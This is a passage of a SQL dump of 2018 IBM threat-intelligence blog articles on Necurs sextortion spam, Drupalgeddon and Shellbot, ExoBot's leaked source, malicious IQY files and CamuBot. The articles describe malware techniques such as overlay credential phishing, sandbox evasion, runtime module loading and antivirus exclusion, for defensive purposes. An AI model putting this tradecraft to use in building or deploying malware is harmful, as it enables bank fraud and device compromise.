domain is .co.uk, for example, the email will be sent in English, and if the domain in .fr, it will be sent in French. While the campaign included versions of this scam in seven different languages, the overwhelming majority of emails were sent in German and ended up in X-Force spam honeypots when recipient email addresses had a .de or .ch TLD. Languages touched by this campaign so far include: Our researchers were somewhat surprised to see Arabic, Japanese and Korean on the list, since those languages are harder to machine-translate and are rarely targeted by international crooks. The French email was written by someone who is likely a French speaker, and not translated online like the English version, for example. It could be indicative of some of those involved originating in Europe and possibly collaborating with counterparts in other parts of the world. It is unusual to be able to judge the success of a spam campaign from the outside. Security researchers rarely have access to metrics of how many people opened a malicious email, how many went to the phishing site or how many ended up paying the criminals. In this case, however, there is a way to get a general idea because the attackers used bitcoin wallet addresses. In all, X-Force saw 500 bitcoin addresses used in this campaign; however, most emails indicated the same few wallets while others were rarely used. It was therefore possible to look up the miscreants’ financial profits via services such as BitRef that enable researchers to check bitcoin wallet balances. While we did not check every wallet, we did want to see if the attackers were getting any money. We spot-checked the top 20 bitcoin addresses used in the campaign. As an example, one of the addresses that appeared in over 3 million email messages sent to German recipients amassed 0.52 BTC, which was equal to about $3,300 as of September 20, 2018. That wallet never got any more money and stopped receiving coins on September 19. The situation was similar for the other frequently used wallets in the campaign: The amount of bitcoin contained in only the 20 main wallets totals about $50,000. Some wallets are still actively receiving coins. Most wallets show some withdrawals of the coins, bringing them to zero, which means the attackers have been removing the coins to another wallet or cashing them out. October is   in the U.S., making it a great opportunity to remind employees, family and friends to polish up on some information security basics, especially those related to email. Put simply, you should always avoid opening unsolicited email. This can minimize the opportunity to fall for a social engineering scam. These communications are carefully crafted to lure people to take action, especially if they trigger an emotional reaction such as fear, urgency or, in this case, embarrassment. You should also enable email filtering on your accounts to prevent most spam from getting through. Keep your devices clear of malware, run an up-to-date antivirus program and, if ever in doubt, have them examined by a professional. If possible, use a separate device for online banking and other activities that involve the transfer of sensitive information. In general, adult content websites are known for high traffic and therefore are often a target for cybercriminals, which helped lend this scam some added credibility. Visit the X-Force Exchange to learn more about this campaign. For tips to keep yourself safe from online scams and malware, check out the FBI’s   and  .', '\'Botnets\', \'Cyber Extortion\', \'Cybercrime\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Phishing\', \'Phishing Attack\', \'Phishing Email\', \'Social Engineering\', \'Spam\', \'Spam Emails\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/the-many-faces-of-necurs-how-the-botnet-spewed-millions-of-spam-emails-for-cyber-extortion/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (8, 'Threat Actors Prey on Drupalgeddon Vulnerability to Mass-Compromise Websites and Underlying Servers', 'Noah Adjonyo', '2018-10-10', 'IBM Security’s   team monitors the enterprise threat landscape on an ongoing basis, detecting and mapping new threats as they emerge. In a recent investigation, our MSS intelligence analysts discovered that malicious actors are using recent Drupal vulnerabilities to target various websites and possibly the underlying infrastructure that hosts them, leveraging Shellbot to open backdoors. This appears to be a financially motivated effort to mass-compromise websites. How can defenders keep websites and underlying systems safe in the face of these evolving threats? Like  , Drupal is a content management system (CMS) that is used widely by people who create and maintain websites and applications for all sorts of purposes, both personal and business, private and public. Drupal is open source and, as such, is maintained by a community of users. This is also how its security and vulnerability patching is maintained. CMSs that are used across a large number of websites are juicy targets for cybercriminals, who commonly automate their attacks in a one-size-fits-all type of operation. Those who target random websites aim to compromise as many as possible and consider the monetization options later. To do that, malicious actors often pick a vulnerability and then probe for exploitable sites en masse. Those found unpatched or vulnerable for some other reason might fall under the attacker’s control, which could mean a complete compromise of that site. With this level of control, the attacker has access to the site as a resource from which to steal data, host malicious content or launch additional attacks. In recent investigations into malicious activity targeting enterprises across the globe, our team detected an IP address that was repeatedly sending the same HTTP POST request: Further examination of these requests revealed additional sources of similar traffic from a number of command-and-control (C&C) servers, hosting servers that download a Perl script to launch the Shellbot malware and a payload naming pattern that started to paint the picture of a widespread cyberattack. Our team traced the beginning of this campaign to mid-August 2018. Scanning websites for vulnerable configurations, the attackers leveraged a critical remote code execution (RCE) vulnerability known as  , or  , to eventually open a backdoor using the Shellbot malware. The scan also included a second vulnerability, CVE-2018-7602, another highly critical RCE flaw. Both these flaws have been patched, but vulnerabilities persists as users delay in patching and upgrading. As we continued to look into the attack, vulnerable websites were scanned for the /user/register and /user/password pages in the installation phase as attackers tried to brute-force their way in with existing user access details discovered while attempting to “wget” the Perl script for Backdoor.Shellbot. When successful, the script ran a shell command injection that was used to install the Perl-based bot. The Shellbot instance in our investigation connected to an Internet Relay Chat (IRC) channel and used it as a C&C hub to receive instructions from its controller. The bot contained multiple tools to perform distributed denial-of-service (DDoS) attacks and search for SQL injection weaknesses and other vulnerabilities, including   to reach root level on the victimized system. The vulnerabilities used in this campaign were leveraged in an automated way, allowing attackers to scan a large number of websites with minimal effort. Moreover, if successfully exploited, the flaw could lead to a potential compromise of the web application with the possibility of spilling over to the underlying operating system as well. Shellbot itself is an old code that has been around since about 2005, used maliciously to remotely access and control compromised endpoints. Shellbot can open remote command line shells, perform denial-of-service attacks, run tasks and processes, download additional files per the attacker’s command, and change the endpoint’s settings, to name a few. Shellbot may seem dated and simplistic, but it is in active use by several threat groups. In March 2017, in the heat of   ( ), ShellBot was packaged as the C&C with the PowerBot malware, which deployed cryptocurrency mining modules on infected devices. This combination allowed criminals to   from their schemes. Reviewing most of the Shellbot malware attacks we have detected in recent months, our team identified some variants with instructions to: It costs a lot of time and money to find or buy a zero-day flaw — two resources cybercriminals are typically not willing to invest. It is much more lucrative to use   such as Drupalgeddon and attack code in an automated way, especially when users delay patching and updating their applications. Here are some tips from our security specialists on how to mitigate the risk from existing vulnerabilities and those who use them to compromise web resources and assets: Want to know more? Find indicators of compromise (IoCs) and more technical details about this campaign on  .', '\'Advanced Threats\', \'Command-and-Control (C&C)\', \'Content Management System (CMS)\', \'Distributed Denial-of-Service (DDoS)\', \'Drupal\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Phishing\', \'Threat Intelligence\', \'Vulnerabilities\', \'Vulnerability Analysis\', \'Vulnerability Management\', \'X-Force\'', 'https://securityintelligence.com/threat-actors-prey-on-drupalgeddon-vulnerability-to-mass-compromise-websites-and-underlying-servers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (9, 'How Nick Bradley Made a Career of Pursuing Bad Guys, From the Military to X-Force IRIS', 'Security Intelligence Staff', '2018-10-4', 'These days, Nick Bradley is policing the world of cyberthreats in his role as practice lead of the IBM X-Force Incident Response and Intelligence Services (IRIS) Threat Analysis Group — but that wasn’t always the plan.\n Nick comes from a multigenerational military family — his daughters are currently about to enter the service. Growing up in “middle of nowhere Florida,” there weren’t many options for Nick; he could either follow his family into the military or go to work at the local federal prison as a correctional officer. He pursued the best of both worlds by entering active duty with the Army military police, working his way to sergeant and switching to Reserves so he could study and become an officer, all the while maintaining a private hobby building computers and gaming.\n One day, Nick came into work at the dispatch desk to find the computer switched off; it had a virus, the desk sergeant said, and they needed to wait for IT to come and fix it tomorrow.\n “So I cleaned it up because I knew how to,” remembers Nick. “And it was something simple, too — it wasn’t some bleeding edge virus, it was one that had been out there forever. Back then, people had viruses on machines all the time. So I cleaned that up and went to work, didn’t think anything more of it.\n “Then the next morning when all of the brass came in, I got called into the sergeant major’s office, and he wanted to know how I knew how to fix that computer.”\n Nick’s personal tech interests ended up causing a  . The brass told him he had a new job as a system administrator in the provost marshal’s office, and the rest is history.\n “The thing was, in my mind, I still wanted to be military police, and so I was just doing this because that’s what they ordered me to do,” he says. “I even got accepted into the SWAT, or what the Army calls the SRT, and I did that on weekends so I could still be a cop.”\n Nick later went to the Army Reserve and joined the Army R.O.T.C. program with the goal of becoming a commissioned officer. During that time, he also picked up some contract IT work to help pay the bills. Ultimately, it was this part-time job that led to a full-time career with Internet Security Systems — later acquired by IBM — and Nick decided not to commission back into active duty.\n “It was an extremely hard decision because I love the military, but I realized I was going to be able to make a difference in this field that I never even knew existed, and that I was going to be able to provide a better life for my wife and kids.”\n These days, Nick is still patrolling and protecting — he’s just a bit more desk-bound than he was while on active duty. Running the threat analysis group inside X-Force IRIS means Nick is in charge of the team that scours the net for signs of threats, turning it all into actionable intelligence not just for IBM clients, but for the world at large.\n Quick to point out their role within a larger team — and that a lot of other groups contribute to the threat analysis — Nick explains how he and his X-Force IRIS colleagues identify issues. Using proprietary tools, the team scrapes the internet for text featuring keywords and information they find important:   being released, vulnerabilities exposed, breach disclosures and other info. They also have other groups within IBM they use as trusted sources, such as the incident response side of   and IBM Trusteer, as well as external companies including Cisco Talos, Palo Alto Networks, Trend Micro and others.\n \n “Our primary goal is to parse through all that noise and sort out what is hot versus what is just hype,” Nick says, explaining that the important information is made available through the team’s daily newsletter and through  .\n “We don’t just want to be the person running around screaming ‘the sky is falling’ — we want to be the one telling you here’s where you go so you don’t get hurt. So we are always trying to share not just the intel, but also some form of action that can be taken, or  . That ranges from mitigation recommendations to actual indicators of compromise, what’s called IoC, and those can usually be directly loaded into protection platforms or into SIEMs.”\n After nearly two decades watching threats and developing mitigations, Nick says the biggest thing that’s changed in cybersecurity is that the world now (finally!) takes it seriously. It used to be difficult to get a company to spend money on security; once they started seeing competitors suffer financial and reputational damage, though, that all changed.\n But if the good news is that everyone has become more security-savvy, flip side is that the “bad guys are getting more sophisticated as well,” Nick says. Plus, there’s now there’s a “trickle-down” effect where high-level threat actors and advanced persistent threat (APT) groups release their tools onto the web, and lesser groups then access them to wreak their own havoc.\n “One thing I think has significantly changed is the idea of hacking for infamy and glory,” says Nick. “For the longest time it was about compromising somebody and defacing their website — ‘you’ve been hacked, haha.’ It still happens, but that’s not the focus anymore. The focus now is espionage; it’s about money, sabotage, political agendas.”\n All that must be hard for a guy from a law enforcement background. Nick says it was difficult at first to get used to mitigating, defending and protecting instead of directly going after the bad guys.\n “That is a stark difference,” he says, “but I still think you make a better impact with protecting and defending than you would trying to go after individuals. We leave that to the FBI.”', '\'Cybersecurity\', \'Threat Detection\', \'Threat Intelligence\', \'Threat Monitoring\', \'Threat Sharing\', \'X-Force\'', 'https://securityintelligence.com/how-nick-bradley-made-a-career-of-pursuing-bad-guys-from-the-military-to-x-force-iris/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (10, 'TRusted Anonymous Data Exchange (TRADE) Threat Intelligence Sharing With Blockchain', 'Sridhar Muppidi', '2018-9-26', 'Former U.S. Secretary of Defense Donald Rumsfeld once said, “See that the President, the Cabinet and staff are informed. If cut out of the information flow, their decisions may be poor, not made, or not confidently or persuasively implemented.” As we saw with the discovery of the  , threat intelligence sharing is critical to discovering new threats. So what is inhibiting the smooth flow of the highest-value threat intelligence? According to the  , 60 percent of companies that belong to industry-specific threat sharing communities, such as the IT Information Sharing & Analysis Center (ISAC), do not share intelligence outside the organization due to fear of revealing a breach and the resulting liability from that disclosure. Inadvertently revealing a vulnerability or breach leaves companies open to reputational brand damage and the threat of legal action. IBM’s security research lab in Be’er Sheva, Israel invented a new way to share threat intelligence that allows companies to control who has access to this data (without revealing the source of the information) and the quality of the anonymous information they consume (without knowing exactly which organization contributed the information). TRusted Anonymous Data Exchange (TRADE) is an IBM Hyperledger Fabric (blockchain) network that allows members to exchange information by leveraging smart contracts to define the levels of trust and anonymity required to enable collaboration. A smart contract is used to enforce organizational requirements for attributes such as reputation and contribution levels to limit who has access to the threat intelligence information that members publish. TRADE leverages existing threat intelligence exchange protocols — such as Trusted Automated Exchange of Intelligence Information (TAXII) and Structured Threat Information Expression (STIX) — that are integrated with operational workflows. Each time a member of the networks contributes, accesses or enriches threat information, the transaction is recorded on the  . This way, a full history of the information flow is immutably recorded and can be audited if necessary at a later date. There are two common models for establishing trust in   today. The first is based on a trusted third party, and the second is point to point based on trust established through personal relationships. Both of these models have drawbacks that are addressed by TRADE. The third-party model introduces the trusted third party as a bottleneck, delaying the spread of crucial threat intelligence. Trust based on personal relationships inherently has coverage and scalability gaps. Using blockchain permits TRADE to mimic the peer-to-peer trust model, but without coverage gaps or delays. Another   noted that the value of threat intelligence diminishes within minutes, so timely dissemination of this information is crucial to stopping attackers before they can cause widespread damage. TRADE allows threat analysts to quickly get the freshest data out to their peers, referred to as coalition members, without risk to the organization. When   is shared anonymously and organizations can opt in to information sharing coalitions at will, how do you avoid the “free rider” problem? What is the incentive for threat analysts to share data in a world where no one knows whether or not they are sharing? TRADE solves this problem by rewarding karma for information shared. To receive and consume threat intelligence data, organizations must spend the karma they’ve earned. But if organizations are incented to contribute threat intelligence so they can then consume threat intelligence, what prevents them from anonymously contributing low-value data? In TRADE, each coalition member can gain or lose reputation based on the quality of the data they contribute. When a member spends karma to receive threat intelligence data that turns out to be flawed or misrepresented, he or she can rate the contribution. Organizations can earn karma discounts for acquiring future threat intelligence by providing a rating for the information they received. If an organization’s reputation falls too low because it submitted low-quality data, they will not be able to access critical threat intelligence. This feature of TRADE ensures data reliability by isolating violators and cheaters. Western novelist Louis L’Amour wrote, “Knowledge is like money: to be of value it must circulate, and in circulating it can increase in quantity and, hopefully, in value.” It’s our hope that TRADE will allow threat intelligence to circulate more freely, leading to an increase in high-quality information that organizations can use to protect themselves from the latest threats.', '\'Blockchain\', \'Malware\', \'Threat Intelligence\', \'Threat Sharing\'', 'https://securityintelligence.com/trusted-anonymous-data-exchange-trade-threat-intelligence-sharing-with-blockchain/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (11, 'Don’t Get Caught Off Base: Make Threat Intelligence a Security Imperative', 'Paola Miranda', '2018-9-14', '“Offense wins games, but defense wins championships.” You’ve probably heard this old adage with respect to professional sports, but the proverb can also shed light on the importance of threat intelligence in cybersecurity operations, where weak defense can result in much more costly repercussions than a home run by the opposing team. When it comes to protecting your organization, a security operations center (SOC), like a good baseball team, needs a strong defense to prevent attackers from scoring, predict the offense’s next move and proactively hunt for threats. To do so, security teams need to understand the   and the value that each contributes to the decision-making process at different levels of the enterprise. All SOCs are not created equal. They come in different shapes and sizes, but they all share the goals of protecting their organization and fighting malicious actors. The right threat intelligence at the right time empowers your team to block attacks in real time and helps mitigate the risk of attackers affecting your brand and reputation. So how do you choose the right threat intelligence for your organization? Right off the bat, the threat intelligence landscape is complex. Offerings are plentiful and confusing, and there are many variables unique to your organization and industry that you should consider. Without clear goals and objectives, the task may seem daunting, but it can be simplified once you understand how to maximize the three types of threat intelligence: tactical, operational and strategic. Let’s dive in to each type so you can begin formulating a   that covers all your bases. Numerous external and internal threats expose your organization to threats on a day-to-day basis. Some of these turn out to be false positives while others turn into successful attacks. Without proper context, the vast amount of information available to your team to monitor threats can be overwhelming, and   can fatigue your analysts and cloud their judgment to identify real threats. Tactical threat intelligence is technical data obtained from daily monitoring and analysis. This helps your security team detect and prevent unknown attacks. With this type of intelligence, analysts can better differentiate between potential threats by using indicators of compromise (IoCs) such as IP addresses, URLs and hashes. Tactical threat intelligence empowers your SOC to make immediate decisions to act against real-time threats that pose a significant risk to your organization. With repetition and practice, professional athletes improve on their game. The same is true for your security team. With experience, analysts can develop the skill of identifying threat patterns and attacker methodologies to proactively hunt for threats, leading to a stronger defense and more effective  . Operational threat intelligence is a combination of technical data and profound analysis of threat groups, malware families, and tactics, techniques and procedures (TTPs). This type of threat intelligence will help your organization make better day-to-day decisions on task prioritization, threat mitigation and resource allocation. The beauty of sitting in the nosebleed section is that you get a bird’s-eye view of the game. Strategic threat intelligence is similar in that it’s most valuable to the highest levels of your organization, and it impacts critical companywide decisions. This type of threat intelligence is a real team effort; although it’s nontechnical in nature, it typically builds on top of tactical and operational threat intelligence. Strategic threat intelligence explains the motivations of attackers, identifies future trends and considers current geopolitical events. With this information, executives can make informed decisions to mitigate future risk by enhancing security through refined organizational structure, improved internal processes and policies, and increased spending on resources and capabilities. Now that you have a basic understanding of   and how it adds value to the decision-making process at different levels of an enterprise, you can set your goals and objectives and use them as a filter to evaluate, compare and select the right combination of threat intelligence. Every organization is unique, but with the right resources in place, your team will be ready to play in the big leagues.', '\'Incident Response (IR)\', \'Security Intelligence\', \'Security Operations Center (SOC)\', \'Threat Intelligence\', \'Threat Prevention\'', 'https://securityintelligence.com/dont-get-caught-off-base-make-threat-intelligence-a-security-imperative/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (12, 'New Gartner Report Recommends a Vulnerability Management Process Based on Weaponization and Asset Value', 'Abby Ross', '2018-9-13', 'Analyst firm Gartner recently published a report titled, “ .” It focused on a risk-based approach for a vulnerability management process and includes several statements and recommendations that our X-Force Red team strongly supports. Some of them include: X-Force Red built   with these same methodologies in mind. One of the biggest challenges plaguing security teams worldwide is figuring out which vulnerabilities, out of hundreds of thousands that are uncovered daily, to remediate first. With limited time and resources, security teams manually sift through each vulnerability, trying to decipher which one could cause the most harm to their organization. Many have relied on the Common Vulnerability Scoring System (CVSS), but those scores do not factor in the importance of an exposed asset, or whether the vulnerability is actively weaponized by criminals. As a result, security teams often waste time following up on   and minimal risk vulnerabilities, while the most dangerous ones remained unpatched. X-Force Red set out to help organizations tackle the prioritization problem by focusing on the same key components covered in Gartner’s recent report: weaponization, severity and asset value. X-Force Red VMS includes automated ranking. After a scan produces an extensive list of vulnerabilities, our proprietary analytics correlate the criticality, asset value and active exploits. We then automatically rank the vulnerabilities, prioritizing those that have been weaponized to expose a high-value asset. Whereas manual prioritization methods typically take four to five days to complete, our ranking is done within minutes, enabling remediation to begin immediately. The core function of our ranking formula is  . A broken door on a safe is a serious vulnerability; a broken door on a safe with a burglar outside is a more serious vulnerability. We train your enterprise to start by securing the latter. We apply that philosophy to every vulnerability we detect, and, based on its latest report, it’s clear Gartner shares that view.', '\'Gartner\', \'Patch Management\', \'Penetration Testing\', \'Risk Management\', \'Threat Intelligence\', \'Vulnerabilities\', \'Vulnerability Analysis\', \'Vulnerability Management\', \'X-Force\'', 'https://securityintelligence.com/new-gartner-report-recommends-a-vulnerability-management-process-based-on-weaponization-and-asset-value/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (13, 'IBM X-Force Delves Into ExoBot’s Leaked Source Code', 'Shahar Tavor', '2018-9-10', 'Following the   of the Android banking Trojan ExoBot, IBM X-Force research delved into the malware’s inner workings to help uncover insights into its dynamic mechanisms and the features that help criminals use it in cross-channel bank fraud. ExoBot is Android malware that was based originally on a previous code known as  . This code represents a banking Trojan that uses the overlay technique — that is, popping up fake windows that hide the original app users open — to trick victims into tapping their banking credentials into a fake interface. After stealing account access details, the malware can also intercept SMS messages and phone calls, thereby enabling criminals to take over the victim’s bank account and other financial accounts at their discretion. Some of the capabilities that enable ExoBot to facilitate fraudulent activity on infected devices include gaining admin privileges, launching overlay screens, and exfiltrating SMS, data and other information from the infected device. In 2016, ExoBot’s developer was selling the malware on the clear web for a while, even   in May 2017. In January 2018, the actor   in the underground, but by May 2018, the source code was leaked online by an unknown actor. Source code leaks, especially those of Android malware codes, have  . When they do, they give rise to variants and variations of the same malware, lowering the bar for more criminals to enter the mobile malware scene and try their hand at mobile banking fraud. The following sections describe technical details about ExoBot as analyzed by X-Force mobile threat researcher Shahar Tavor. Having analyzed ExoBot’s leaked source code, X-Force researchers found the malware to possess some notable features, such as dynamic modules loaded at runtime and some anti-emulation tricks to evade popular sandboxes. The image below illustrates the malware’s architecture. The overall routine occurs as follows: \n \n ExoBot mostly spreads to new devices via SMS spam and sometimes via downloader apps that  . At its first run on a device, ExoBot removes the application icon from the home screen, minimizes all running apps, and then shows the home screen so that the infected user wouldn’t notice anything new on his or her device. To evade sandboxes and automated analysis, ExoBot performs several checks before running: Interestingly, Canada and the U.S. are on the list of countries that would not be targeted. A second filter is applied by the language set on the device. The following language specifications will make ExoBot stop running on the device: To be able to use all of its features, especially locking the user’s screen and changing the lock screen’s password, ExoBot needs to run with  . Requiring this permission level involves the infected user, and to solicit his or her help, ExoBot displays a fake screen that purports to be the GNU General Public License. \n \n By gaining the admin permission level, ExoBot can also establish its persistence mechanism and ensure that the user would not be able to remove the app without disabling the malware with equal permissions. Getting rid of ExoBot involves manually removing it from the device admin apps list. Unfortunately, even after removals, ExoBot will pop up a screen asking the user to activate it. To keep its resources protected, ExoBot’s developer uses two obfuscation techniques: \n \n This can be reversed by a decrypt function, which replaces the new key with the default key and reverts to the previous string.\n \n With new infections, ExoBot retrieves modules from the C&C server and then continually keeps in touch with it to check for new tasks assigned by the attacker. If new tasks are found, ExoBot queues them for execution in a designated file located in in a private folder on disk. All the information in the queue is saved in encrypted form. The queue file is used throughout the malware’s activity and life cycle. To keep on top of tasks, ExoBot checks them periodically and by an alarm setup. Requests and responses are kept encrypted in JavaScript Object Notation (JSON) format. \n \n Until a new task is sent through, the malware will continue to update the C&C server with information about the device, the installed apps and a configuration status. \n \n ExoBot’s C&C communication is secured with an SSL. To identify devices, each infected device receives a unique MD5 with its identifiers: IMEI, build model, central processing unit (CPU) and Android ID. The details are transmitted to the C&C server under the “I” field inside every JSON request. Unlike similar malware, ExoBot has a unique method to load its modules in a dynamic way. The image blow shows the code that enables this tactic to work: \n \n The developer here used the payload to manage module loading. The main module is the component that downloads the modules from the C&C on its first run, and it’s also the component that handles them later when they are required to run. Modules are loaded to memory in reflection, giving the malware the ability to inspect and dynamically call classes, methods and attributes at runtime instead of having to do that at compile time. The reflection is implemented using the Android DexClassLoader application programming interface (API), which is a class loader that allows an application to load .jar and APK files. This method can be used to execute code that was not previously installed as part of an existing app and load it into that app during runtime. Note that ExoBot’s .dex file is still present on disk, but the code is not packed within the APK. Using reflection in this case allows the malware to avoid static analysis of its modules and keep them out of antivirus engines’ sight. Moreover, loading in runtime gives ExoBot added agility. It can fetch new modules from the C&C server at any time and add/update its features easily and quickly on devices that are already infected. To execute modules, ExoBot’s C&C server sends the malware a command with relevant parameters alongside the MD5 hash of a .dex file that contains the module to ensure the correct one is executed: \n The malware then proceeds with the required action on the infected device. In some cases, the module may not exist in the malware’s folder on the device, and it will launch a request to download it from the C&C server. \n \n Next, ExoBot hashes the required module on disk and compares its MD5 to the one attributed to that module on the C&C server. This step is taken to prevent tampering and errors. Upon confirming a match, the malware loads the requested module and reports the result back to the C&C server. \n \n A result in JSON format contains data returned from the module alongside an API status field indicating whether the module is running properly or has failed. The following table shows the modules that enable ExoBot’s capabilities. The first table lists the existing modules, and the second one lists modules that were yet to be added by the developer. The following modules are not active as yet: Overlay malware has been around for a while, but the method became popular when   started commercializing it in the underground. Ever since GM Bot,   use the overlay tactic, implementing its use in different ways. In ExoBot’s case, the overlay screen pop-up takes place by detecting the foreground app and then displaying a custom webpage activity to match that app. In the case of banks, cryptocurrency exchanges, payment and shopping apps, the fake screen will match their login screens. To begin, ExoBot gets its target list from the C&C server. The malware scans all the files found under the /proc virtual filesystem to map all running processes the user initiated. It does not scan apps and processes users cannot launch themselves. \n \n At startup, services of the Android operating system run in the bg_non_interactive state. This state means that the service is at low priority at the time and cannot use more than 5 percent of the CPU. To determine if an app of interest is running in the foreground, the malware checks if the app’s process ID (PID) is   in the noninteractive state list. \n \n If a targeted app is running in the foreground, ExoBot will pop up a new activity on top of the original app, covering it and prioritizing the fake screen. In the overlay, a custom webpage impersonates the login interface of the original app to phish the victim’s credentials. On top of targeting banking and other financial applications, social and chat apps, ExoBot possesses a module designed to steal payment card information. This module is tasked with frequent pop-ups of fake screens that require victims to tap their payment card details into the activity. The lure is set up as a notification from Google Play, or from other services for Android-based devices. ExoBot’s code leak is just another leak among others that provide cybercriminals with a basis for malware that they can adapt to their own illicit operations and attacks. With this code leak, X-Force researchers expect to see ExoBot offspring in the coming months, as well as new actors who will use it in different geographies to target local banks through their mobile banking user base. To mitigate the threat of mobile malware, organizations can help protect their apps with  . Those managing employee mobile devices can learn more about IBM’s unified endpoint management (UEM) solution,  . Although we worked directly with the source code, here are some recent ExoBot samples for those looking to analyze this version: Our team also manages and updates an ExoBot collection on  .', '\'Android\', \'Android Malware\', \'Bank Fraud\', \'Command-and-Control (C&C)\', \'Credentials Theft\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/ibm-x-force-delves-into-exobots-leaked-source-code/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (14, 'Threat Actors Peddling Weaponized IQY Files Via Necurs Botnet', 'Scott O\'Neill', '2018-9-5', 'Have you ever walked through a store and spotted an item that looked strange to you, but you put it in your cart anyway? Maybe it was appealing because it was something new you wanted to check out. Maybe it was shiny — you had to have it. If so, threat actors are looking for shoppers just like you. They constantly distribute new “products,” typically in the shape of crafty email spam, to lure the unsuspecting user. A recent wave of malicious “products” has hit the virtual high streets in the form of unsolicited email with internet or web query file (IQY) attachments.\n What is an IQY file attachment, and why is it the flavor of the month for threat actors? Microsoft Excel uses this type of file to pull data from the internet into a spreadsheet. To do that, a URL is embedded into an IQY file, and the file facilitates pulling the data from the specified webpage.\n While IQY file extensions may sound foreign to many users, if you look at enterprise-level networks that use SharePoint, a web-based collaborative platform that integrates with Microsoft Office, for example, you would be sure to find many instances where IQY files are used.\n These files help network users share and edit Excel spreadsheets, among other uses. As you can imagine, a common productivity file with an embedded URL could easily be used for nefarious purposes. This is why these types of files are not made to run code without interacting with the user. To prevent their content from loading automatically, a security prompt is built into the file asking the user if he or she would like to “enable” a data connection when opening an IQY file.\n \n \n IQY files are attractive to threat actors for a couple of reasons. For one, they are easy to create. An IQY file can be created by using a text editing program. Threat actors can insert their malicious instructions into the text editor along with an actionable URL and save it with an “.iqy” extension. They can then use the file to deliver malicious code directly from their malware infection zones. IQYs are also small and inconspicuous, making them easier to plant in an unsolicited email.\n This type of file attachment is relatively unusual and not commonly seen attached to emails, and that is why it can be interesting to an attacker. Attackers constantly shuffle file types in their spam campaigns in an attempt to create an element of surprise for unsuspecting users. They are also trying to catch security solutions off guard, especially those that filter common file types and extensions used in phishing and malware infection campaigns.\n Some recent statistics from IBM X-Force research revealed that the use of IQY files in spam campaigns has been on the rise in recent months. One major malspam distributor, the  , was observed using   for the first time starting on May 25, 2018.\n Between late May and mid-July 2018, IBM X-Force researchers captured over 780,000 spam emails that came from Necurs resources in their spam traps. All of those messages contained IQY attachments.\n \n \n \n \n \n Upon further analysis of the emails captured in our spam traps, the IQY attachments were confirmed to contain malicious URLs. Once users were lured into executing the connection to the embedded URL, the chain of infection on the device was set in motion. This led to the eventual download of the  , a malicious remote access tool of which source code was leaked in March 2018, giving rise to numerous campaigns that spread this malware to hundreds of thousands of users.\n Below are some examples of malicious URLs contained inside Necurs IQY attachments in campaigns X-Force followed:\n In mid-July 2018, a threat actor group known as   also began using malicious IQY attachments. DarkHydrus’ spear phishing emails contained Roshal Archive Compressed (RAR) files that concealed a weaponized IQY file. According to  , the URL inside the IQY file led to running a PowerShell script on the victim’s device to set up a backdoor. The campaign is believed to have been nation-state motivated.\n Another instance yet: The most recently observed use of malicious IQY attachments came from the  . The Marap phishing email campaign started in August 2018. IBM X-Force researchers were able to capture emails from this campaign starting on August 10, 2018, confirming they included malicious IQY file attachments.\n \n \n Using various and often little-known file types and extensions in spam email is a growing trend among major botnet and spam distributors. To ensure that their malicious emails reach recipients and do not end up blocked by email filters, cybercrime groups shuffle their tactics all the time, delivering booby-trapped files in many shapes throughout the year.\n Since IQY files are inherently useful and prevalent on many enterprise networks, some security practices can help mitigate the risk associated with them without having to block the use of those files altogether.', '\'Botnets\', \'Malware\', \'Phishing\', \'Phishing Attack\', \'Remote-Access Trojan (RAT)\', \'Spear Phishing\'', 'https://securityintelligence.com/threat-actors-peddling-weaponized-iqy-files-via-necurs-botnet/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (15, 'CamuBot: New Financial Malware Targets Brazilian Banking Customers', 'Limor Kessem', '2018-9-4', 'IBM X-Force researchers analyzed new financial malware that targets major Brazilian banks through their business banking customers. The malware was dubbed CamuBot because it attempts to camouflage itself as a security module required by the banks it targets. CamuBot emerged in Brazil in August 2018 in what appeared to be targeted attacks against business banking users. According to X-Force’s findings, the malware’s operators are actively using it to target companies and public sector organizations, mixing social engineering and malware tactics to bypass strong authentication and security controls. Unlike other malware operated in Brazil, CamuBot is a defined new code. Very different from typical banking Trojans, CamuBot does not hide its deployment. On the contrary, it is very visible, using bank logos and overall brand imaging to appear like a security application. It thus gains victims’ trust and leads them to install it without realizing they are running an installation wizard for a Trojan horse. CamuBot is more sophisticated than the   commonly used in fraud schemes targeting users in Brazil. Instead of simplistic fake screens and a remote access tool, CamuBot tactics resemble those used by Eastern European-made malware such as  ,   and  , each of which focuses on business banking and blends social engineering with malware-assisted account and device takeover. \n CamuBot’s fraud method is a mix of elements that are designed to lure potential victims into installing the malware on their device and then walk them through unknowingly authorizing a fraudulent transaction. To carry out their attacks, CamuBot operators begin with some basic reconnaissance to find businesses that bank with a certain financial institution. They then initiate a phone call to the person who would likely have the business’s bank account credentials. The attackers identify themselves as bank employees and instruct the victim to browse to a certain URL to check whether his or her security module is up to date. Of course, the validity check comes up negative, and the attackers trick the victim to install a “new” security module for his or her online banking activity. Those lured into downloading the module are advised to close all running programs and run the installation with a Windows administrator profile. \n At this point, a fake application that features the bank’s logos starts downloading. Behind the scenes, CamuBot is fetched and executed on the victim’s device. The name of the file and the URL from which it is downloaded change in every attack. \n As part of its simplistic infection routine, CamuBot writes two files to the %ProgramData% Windows folder to establish a proxy module on the device. The executable’s name is not static and changes in every attack. Then it adds itself to the firewall’s rules to appear trusted. It does the same for the antivirus: \n \n To communicate with the infected device, CamuBot establishes a Secure Shell (SSH)-based 